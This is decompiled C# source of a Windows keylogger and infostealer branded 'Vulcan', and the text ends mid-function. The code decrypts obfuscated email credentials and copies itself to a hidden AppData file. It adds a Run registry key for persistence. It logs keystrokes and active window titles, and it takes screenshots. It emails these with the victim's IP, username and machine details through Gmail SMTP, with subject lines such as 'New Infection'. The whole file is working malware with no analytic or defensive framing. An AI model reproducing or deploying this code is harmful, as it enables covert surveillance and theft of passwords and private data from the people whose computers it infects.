using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns3;

internal class Form1 : Form
{
	private object object_0;

	private string string_0;

	private object object_1;

	private int int_0;

	private int int_1;

	private object object_2;

	private string string_1;

	private string string_2;

	private MessageBoxIcon messageBoxIcon_0;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private bool bool_5;

	private bool bool_6;

	private Bitmap bitmap_0;

	private Graphics graphics_0;

	private IContainer icontainer_0;

	private Timer timer_0;

	private Timer timer_1;

	private TextBox textBox_0;

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_0 = null;
		int_1 = 69;
		InitializeComponent();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetKeyState(int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string method_0()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	[STAThread]
	public static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}

	public static string smethod_0(string string_11, string string_12)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string_12 = smethod_2(string_12);
		tripleDESCryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_12));
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
		byte[] array = Convert.FromBase64String(string_11);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e8: Unknown result type (might be due to invalid IL or missing references)
		string_3 = smethod_0("2yXIKDKfQXwEmvODFkDJAQ==", Conversions.ToString(987231145));
		string_4 = smethod_0("KGJa1fOSHPLU4gazforplQPkMF4kNJ3NVMJ93fnYitc=", string_3);
		string_7 = smethod_0("Cirj+RHUB1byBs7zk5XlXw==", string_3);
		string_8 = smethod_0("J3ZP6fagomY=", string_3);
		string_9 = smethod_0("J3ZP6fagomY=", string_3);
		string_1 = "";
		string_2 = "";
		messageBoxIcon_0 = (MessageBoxIcon)48;
		string_5 = "587";
		string_10 = Conversions.ToString(300000);
		string_6 = "smtp.gmail.com";
		bool_0 = true;
		bool_1 = false;
		bool_2 = false;
		bool_3 = true;
		bool_4 = true;
		bool_5 = false;
		bool_6 = false;
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tunnel.exe"))
		{
			vmethod_0().set_Interval(Conversions.ToInteger(string_10));
			vmethod_2().Start();
			vmethod_0().Start();
		}
		else
		{
			string text = Conversions.ToString(method_6(3, 50000));
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tunnel.exe");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tunnel.exe");
			FileAttributes fileAttributes = FileAttributes.Hidden;
			File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tunnel.exe", FileAttributes.Hidden);
			if (bool_4)
			{
				string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
				string name2 = "Windows applicaton";
				string value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tunnel.exe";
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
				registryKey.SetValue(name2, value, RegistryValueKind.String);
			}
			if (bool_6)
			{
				MessageBox.Show(string_2, string_1, (MessageBoxButtons)0, messageBoxIcon_0);
			}
			if (bool_2)
			{
				Process.Start(string_8);
			}
			if (bool_1)
			{
				method_5(string_9, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text + ".exe", fileAttributes);
			}
			if (bool_5)
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			method_3();
		}
		((Control)this).Hide();
	}

	public bool method_1()
	{
		return (GetKeyState(20) & 1) != 0;
	}

	public bool method_2()
	{
		return GetAsyncKeyState(16) != 0;
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		if (Operators.CompareString(vmethod_4().get_Text(), "", false) == 0)
		{
			vmethod_4().set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class12.smethod_0()).get_Name() + "]: Program Is Off Now";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += vmethod_4().get_Text();
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
			vmethod_4().set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class12.smethod_0()).get_Name() + "]: New Infection";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += "New Infection!!!";
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		if (Operators.CompareString(vmethod_4().get_Text(), "", false) == 0)
		{
			vmethod_4().set_Text("");
			return;
		}
		try
		{
			string text = Conversions.ToString(method_6(3, 50000));
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(string_4);
			mailMessage.To.Add(string_4);
			mailMessage.Subject = "[Vulcan " + ((ServerComputer)Class12.smethod_0()).get_Name() + "]: hack shd";
			if (bool_0)
			{
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".png");
					mailMessage.Attachments.Add(item);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				mailMessage.Body += Environment.NewLine;
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "IP Addresss: " + method_4().ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "OS Version: " + smethod_1();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Username: " + Environment.UserName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Computer Name: " + Environment.MachineName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "System Root: " + Environment.SystemDirectory.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "User Domain Name: " + Environment.UserDomainName.ToString();
				mailMessage.Body += Environment.NewLine;
				mailMessage.Body += "------------------------------------------------";
				mailMessage.Body += Environment.NewLine;
			}
			mailMessage.Body += vmethod_4().get_Text();
			SmtpClient smtpClient = new SmtpClient(string_6);
			smtpClient.Port = Conversions.ToInteger(string_5);
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_4, string_7);
			smtpClient.Send(mailMessage);
			vmethod_4().set_Text("");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						num = 1;
						if (Operators.CompareString(string_0, method_0(), false) != 0)
						{
							goto IL_0017;
						}
						goto IL_0052;
					case 6852:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0017;
							case 3:
								goto IL_0044;
							case 4:
							case 5:
								goto IL_0052;
							case 6:
								goto IL_0059;
							case 7:
								goto IL_006d;
							case 8:
								goto IL_0087;
							case 9:
								goto IL_0090;
							case 11:
							case 12:
								goto IL_00a3;
							case 13:
								goto IL_00b8;
							case 14:
								goto IL_00d3;
							case 15:
								goto IL_00e1;
							case 17:
							case 18:
								goto IL_00f7;
							case 19:
								goto IL_010b;
							case 20:
								goto IL_0126;
							case 21:
								goto IL_0134;
							case 23:
							case 24:
								goto IL_014a;
							case 25:
								goto IL_015f;
							case 26:
								goto IL_017a;
							case 29:
							case 30:
								goto IL_018d;
							case 31:
								goto IL_01a5;
							case 32:
								goto IL_01c0;
							case 33:
								goto IL_01cb;
							case 35:
								goto IL_01de;
							case 36:
								goto IL_01e1;
							case 40:
							case 41:
								goto IL_01f4;
							case 42:
								goto IL_020c;
							case 43:
								goto IL_0227;
							case 44:
								goto IL_0232;
							case 46:
								goto IL_0245;
							case 47:
								goto IL_0248;
							case 51:
							case 52:
								goto IL_025b;
							case 53:
								goto IL_0273;
							case 54:
								goto IL_028e;
							case 55:
								goto IL_0299;
							case 57:
								goto IL_02ac;
							case 58:
								goto IL_02af;
							case 62:
							case 63:
								goto IL_02c2;
							case 64:
								goto IL_02da;
							case 65:
								goto IL_02f5;
							case 66:
								goto IL_0300;
							case 68:
								goto IL_0313;
							case 69:
								goto IL_0316;
							case 73:
							case 74:
								goto IL_0329;
							case 75:
								goto IL_0341;
							case 76:
								goto IL_035c;
							case 77:
								goto IL_0367;
							case 79:
								goto IL_037a;
							case 80:
								goto IL_037d;
							case 84:
							case 85:
								goto IL_0390;
							case 86:
								goto IL_03a8;
							case 87:
								goto IL_03c3;
							case 88:
								goto IL_03ce;
							case 90:
								goto IL_03e1;
							case 91:
								goto IL_03e4;
							case 95:
							case 96:
								goto IL_03f7;
							case 97:
								goto IL_040f;
							case 98:
								goto IL_042a;
							case 99:
								goto IL_0435;
							case 101:
								goto IL_0448;
							case 102:
								goto IL_044b;
							case 106:
							case 107:
								goto IL_045e;
							case 108:
								goto IL_0473;
							case 109:
								goto IL_048e;
							case 110:
								goto IL_0499;
							case 112:
								goto IL_04ac;
							case 113:
								goto IL_04af;
							case 117:
							case 118:
								goto IL_04c2;
							case 119:
								goto IL_04d7;
							case 120:
								goto IL_04f2;
							case 121:
								goto IL_04fd;
							case 123:
								goto IL_0510;
							case 124:
								goto IL_0513;
							case 128:
							case 129:
								goto IL_0526;
							case 130:
								goto IL_053e;
							case 131:
								goto IL_055c;
							case 132:
								goto IL_056a;
							case 134:
								goto IL_0580;
							case 135:
								goto IL_0586;
							case 139:
							case 140:
								goto IL_059c;
							case 141:
								goto IL_05b4;
							case 142:
								goto IL_05d2;
							case 143:
								goto IL_05e0;
							case 145:
								goto IL_05f6;
							case 146:
								goto IL_05fc;
							case 150:
							case 151:
								goto IL_0612;
							case 152:
								goto IL_062a;
							case 153:
								goto IL_0648;
							case 154:
								goto IL_0656;
							case 156:
								goto IL_066c;
							case 157:
								goto IL_0672;
							case 161:
							case 162:
								goto IL_0688;
							case 163:
								goto IL_06a0;
							case 164:
								goto IL_06be;
							case 165:
								goto IL_06cc;
							case 167:
								goto IL_06e2;
							case 168:
								goto IL_06e8;
							case 172:
							case 173:
								goto IL_06fe;
							case 174:
								goto IL_0716;
							case 175:
								goto IL_0734;
							case 176:
								goto IL_0742;
							case 178:
								goto IL_0758;
							case 179:
								goto IL_075e;
							case 183:
							case 184:
								goto IL_0774;
							case 185:
								goto IL_078c;
							case 186:
								goto IL_07aa;
							case 187:
								goto IL_07b8;
							case 189:
								goto IL_07ce;
							case 190:
								goto IL_07d4;
							case 194:
							case 195:
								goto IL_07ea;
							case 196:
								goto IL_0802;
							case 197:
								goto IL_0820;
							case 198:
								goto IL_082e;
							case 200:
								goto IL_0844;
							case 201:
								goto IL_084a;
							case 205:
							case 206:
								goto IL_0860;
							case 207:
								goto IL_0878;
							case 208:
								goto IL_0896;
							case 209:
								goto IL_08a4;
							case 211:
								goto IL_08ba;
							case 212:
								goto IL_08c0;
							case 216:
							case 217:
								goto IL_08d6;
							case 218:
								goto IL_08ee;
							case 219:
								goto IL_090c;
							case 220:
								goto IL_091a;
							case 221:
								goto IL_092b;
							case 223:
								goto IL_0944;
							case 224:
								goto IL_094a;
							case 227:
							case 228:
								goto IL_0960;
							case 229:
								goto IL_0978;
							case 230:
								goto IL_0996;
							case 231:
								goto IL_09a4;
							case 233:
								goto IL_09ba;
							case 234:
								goto IL_09c0;
							case 238:
							case 239:
								goto IL_09d6;
							case 240:
								goto IL_09ee;
							case 241:
								goto IL_0a0c;
							case 243:
							case 244:
								goto IL_0a22;
							case 245:
								goto IL_0a3a;
							case 246:
								goto IL_0a58;
							case 247:
								goto IL_0a66;
							case 249:
								goto IL_0a7c;
							case 250:
								goto IL_0a82;
							case 254:
							case 255:
								goto IL_0a98;
							case 256:
								goto IL_0ab0;
							case 257:
								goto IL_0ace;
							case 258:
								goto IL_0adc;
							case 260:
								goto IL_0af2;
							case 261:
								goto IL_0af8;
							case 265:
							case 266:
								goto IL_0b0e;
							case 267:
								goto IL_0b26;
							case 268:
								goto IL_0b44;
							case 271:
							case 272:
								goto IL_0b5a;
							case 273:
								goto IL_0b71;
							case 274:
								goto IL_0b8f;
							case 275:
								goto IL_0b9d;
							case 277:
								goto IL_0bb3;
							case 278:
								goto IL_0bb9;
							case 282:
							case 283:
								goto IL_0bcf;
							case 284:
								goto IL_0bea;
							case 285:
								goto IL_0c08;
							case 286:
								goto IL_0c16;
							case 288:
								goto IL_0c2c;
							case 289:
								goto IL_0c32;
							case 293:
							case 294:
								goto IL_0c48;
							case 295:
								goto IL_0c63;
							case 296:
								goto IL_0c81;
							case 297:
								goto IL_0c8f;
							case 299:
								goto IL_0ca5;
							case 300:
								goto IL_0cab;
							case 304:
							case 305:
								goto IL_0cc3;
							case 306:
								goto IL_0cde;
							case 307:
								goto IL_0cfc;
							case 308:
								goto IL_0d0a;
							case 310:
								goto IL_0d20;
							case 311:
								goto IL_0d26;
							case 315:
							case 316:
								goto IL_0d3c;
							case 317:
								goto IL_0d57;
							case 318:
								goto IL_0d75;
							case 319:
								goto IL_0d83;
							case 321:
								goto IL_0d99;
							case 322:
								goto IL_0d9f;
							case 326:
							case 327:
								goto IL_0db5;
							case 328:
								goto IL_0de7;
							case 329:
								goto IL_0e08;
							case 370:
							case 371:
								goto IL_0e26;
							case 330:
								goto IL_0e45;
							case 331:
								goto IL_0e56;
							case 361:
							case 362:
								goto IL_0ea3;
							case 333:
							case 335:
								goto IL_0eb9;
							case 337:
							case 338:
								goto IL_0ecf;
							case 340:
							case 341:
								goto IL_0ee5;
							case 343:
							case 344:
								goto IL_0efb;
							case 346:
							case 347:
								goto IL_0f11;
							case 349:
							case 350:
								goto IL_0f27;
							case 352:
							case 353:
								goto IL_0f3d;
							case 355:
							case 356:
								goto IL_0f53;
							case 358:
							case 359:
								goto IL_0f69;
							case 365:
								goto IL_0f7f;
							case 366:
								goto IL_0f85;
							case 372:
								goto IL_0fab;
							case 373:
								goto IL_0fe0;
							case 374:
								goto IL_1001;
							case 393:
							case 394:
								goto IL_101f;
							case 375:
								goto IL_103e;
							case 376:
								goto IL_104c;
							case 377:
								goto IL_105a;
							case 379:
								goto IL_1085;
							case 380:
								goto IL_108b;
							case 383:
								goto IL_10b3;
							case 384:
								goto IL_10b9;
							case 385:
								goto IL_10c7;
							case 387:
								goto IL_10ef;
							case 388:
								goto IL_10f5;
							case 10:
							case 16:
							case 22:
							case 27:
							case 34:
							case 37:
							case 38:
							case 45:
							case 48:
							case 49:
							case 56:
							case 59:
							case 60:
							case 67:
							case 70:
							case 71:
							case 78:
							case 81:
							case 82:
							case 89:
							case 92:
							case 93:
							case 100:
							case 103:
							case 104:
							case 111:
							case 114:
							case 115:
							case 122:
							case 125:
							case 126:
							case 133:
							case 136:
							case 137:
							case 144:
							case 147:
							case 148:
							case 155:
							case 158:
							case 159:
							case 166:
							case 169:
							case 170:
							case 177:
							case 180:
							case 181:
							case 188:
							case 191:
							case 192:
							case 199:
							case 202:
							case 203:
							case 210:
							case 213:
							case 214:
							case 222:
							case 225:
							case 226:
							case 232:
							case 235:
							case 236:
							case 242:
							case 248:
							case 251:
							case 252:
							case 259:
							case 262:
							case 263:
							case 269:
							case 276:
							case 279:
							case 280:
							case 287:
							case 290:
							case 291:
							case 298:
							case 301:
							case 302:
							case 309:
							case 312:
							case 313:
							case 320:
							case 323:
							case 324:
							case 332:
							case 336:
							case 339:
							case 342:
							case 345:
							case 348:
							case 351:
							case 354:
							case 357:
							case 360:
							case 363:
							case 364:
							case 367:
							case 368:
							case 378:
							case 381:
							case 382:
							case 386:
							case 389:
							case 390:
							case 391:
							case 397:
								goto IL_111b;
							case 398:
								goto IL_112f;
							case 399:
								goto IL_113c;
							case 400:
							case 401:
								goto IL_1152;
							case 402:
								goto IL_116b;
							case 403:
							case 404:
								goto IL_1187;
							case 395:
								goto end_IL_0000_2;
							case 28:
								num = 28;
								int_0++;
								goto IL_018d;
							case 39:
								num = 39;
								int_0++;
								goto IL_01f4;
							case 50:
								num = 50;
								int_0++;
								goto IL_025b;
							case 61:
								num = 61;
								int_0++;
								goto IL_02c2;
							case 72:
								num = 72;
								int_0++;
								goto IL_0329;
							case 83:
								num = 83;
								int_0++;
								goto IL_0390;
							case 94:
								num = 94;
								int_0++;
								goto IL_03f7;
							case 105:
								num = 105;
								int_0++;
								goto IL_045e;
							case 116:
								num = 116;
								int_0++;
								goto IL_04c2;
							case 127:
								num = 127;
								int_0++;
								goto IL_0526;
							case 138:
								num = 138;
								int_0++;
								goto IL_059c;
							case 149:
								num = 149;
								int_0++;
								goto IL_0612;
							case 160:
								num = 160;
								int_0++;
								goto IL_0688;
							case 171:
								num = 171;
								int_0++;
								goto IL_06fe;
							case 182:
								num = 182;
								int_0++;
								goto IL_0774;
							case 193:
								num = 193;
								int_0++;
								goto IL_07ea;
							case 204:
								num = 204;
								int_0++;
								goto IL_0860;
							case 215:
								num = 215;
								int_0++;
								goto IL_08d6;
							case 237:
								num = 237;
								int_0++;
								goto IL_09d6;
							case 253:
								num = 253;
								int_0++;
								goto IL_0a98;
							case 264:
								num = 264;
								int_0++;
								goto IL_0b0e;
							case 270:
								num = 270;
								int_0++;
								goto IL_0b5a;
							case 281:
								num = 281;
								int_0++;
								goto IL_0bcf;
							case 292:
								num = 292;
								int_0++;
								goto IL_0c48;
							case 303:
								num = 303;
								int_0++;
								goto IL_0cc3;
							case 314:
								num = 314;
								int_0++;
								goto IL_0d3c;
							case 325:
								num = 325;
								int_0++;
								goto IL_0db5;
							case 369:
								num = 369;
								int_0++;
								goto IL_0e26;
							case 392:
								num = 392;
								int_0++;
								goto IL_101f;
							default:
								goto end_IL_0000;
							case 396:
							case 405:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_1187:
						num = 404;
						Application.DoEvents();
						goto end_IL_0000_3;
						IL_0017:
						num = 2;
						vmethod_4().set_Text(vmethod_4().get_Text() + "\r\n[" + method_0() + "]\r\n");
						goto IL_0044;
						IL_0044:
						num = 3;
						string_0 = method_0();
						goto IL_0052;
						IL_0052:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0059;
						IL_0059:
						num = 6;
						object_1 = GetAsyncKeyState(13);
						goto IL_006d;
						IL_006d:
						num = 7;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0087;
						}
						goto IL_00a3;
						IL_0087:
						num = 8;
						int_0 = 0;
						goto IL_0090;
						IL_0090:
						num = 9;
						object_2 = "\r\n";
						goto IL_111b;
						IL_00a3:
						num = 12;
						object_1 = GetAsyncKeyState(17);
						goto IL_00b8;
						IL_00b8:
						num = 13;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_00d3;
						}
						goto IL_00f7;
						IL_00d3:
						num = 14;
						object_2 = "[Ctrl]";
						goto IL_00e1;
						IL_00e1:
						num = 15;
						int_0 += 4;
						goto IL_111b;
						IL_00f7:
						num = 18;
						object_1 = GetAsyncKeyState(8);
						goto IL_010b;
						IL_010b:
						num = 19;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0126;
						}
						goto IL_014a;
						IL_0126:
						num = 20;
						object_2 = "[Backspace]";
						goto IL_0134;
						IL_0134:
						num = 21;
						int_0 += 4;
						goto IL_111b;
						IL_014a:
						num = 24;
						object_1 = GetAsyncKeyState(32);
						goto IL_015f;
						IL_015f:
						num = 25;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_017a;
						}
						goto IL_018d;
						IL_017a:
						num = 26;
						object_2 = " ";
						goto IL_111b;
						IL_018d:
						num = 30;
						object_1 = GetAsyncKeyState(186);
						goto IL_01a5;
						IL_01a5:
						num = 31;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_01c0;
						}
						goto IL_01f4;
						IL_01c0:
						num = 32;
						if (!method_2())
						{
							goto IL_01cb;
						}
						goto IL_01de;
						IL_01cb:
						num = 33;
						object_2 = ";";
						goto IL_111b;
						IL_01de:
						num = 35;
						goto IL_01e1;
						IL_01e1:
						num = 36;
						object_2 = ":";
						goto IL_111b;
						IL_01f4:
						num = 41;
						object_1 = GetAsyncKeyState(187);
						goto IL_020c;
						IL_020c:
						num = 42;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_0227;
						}
						goto IL_025b;
						IL_0227:
						num = 43;
						if (!method_2())
						{
							goto IL_0232;
						}
						goto IL_0245;
						IL_0232:
						num = 44;
						object_2 = "=";
						goto IL_111b;
						IL_0245:
						num = 46;
						goto IL_0248;
						IL_0248:
						num = 47;
						object_2 = "+";
						goto IL_111b;
						IL_025b:
						num = 52;
						object_1 = GetAsyncKeyState(188);
						goto IL_0273;
						IL_0273:
						num = 53;
						if (Operators.ConditionalCompareObjectEqual(object_1, (object)(-32767), false))
						{
							goto IL_028e;
						}
						goto IL_02c2;
						IL_028e:
						num = 54;
						if (!method_2())
						{
							goto IL_0299;
						}
						goto IL_02ac;
						IL_0299:
						num = 55;
						object_2 = ",";
						goto IL_111b;
						IL_02ac:
						num = 57;
						goto IL_02af;
						IL_02af:
						num = 58;
						object_2 = "<";
